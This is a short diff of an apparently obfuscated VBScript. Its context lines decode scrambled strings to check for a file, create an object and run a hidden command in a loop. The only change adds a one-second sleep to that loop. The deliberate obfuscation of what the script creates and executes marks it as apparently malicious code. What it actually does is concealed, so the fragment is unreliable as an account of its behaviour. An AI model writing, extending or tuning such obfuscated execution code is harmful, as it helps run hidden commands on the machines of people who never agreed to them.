@@ -107,6 +107,7 @@ If lRiDgJJ.FileExists(x0ZaS6D0("/d~9K0\R3K(in[shUiyRey") + oxSeFdTron + x0ZaS6D0
     ogqpfsoIY.Run kZgPyx
     retk56kw534w34 = false
 end if
+wscript.sleep 1000
 Loop
 sXs1eM1FHX = true
 Set z1l5NWZp = CreateObject(x0ZaS6D0("|29I?Y|hL_qfVjG_rdd]{$M<1_[b%[-IeoViWj][+cvEAX5`![]Y0j|B"))
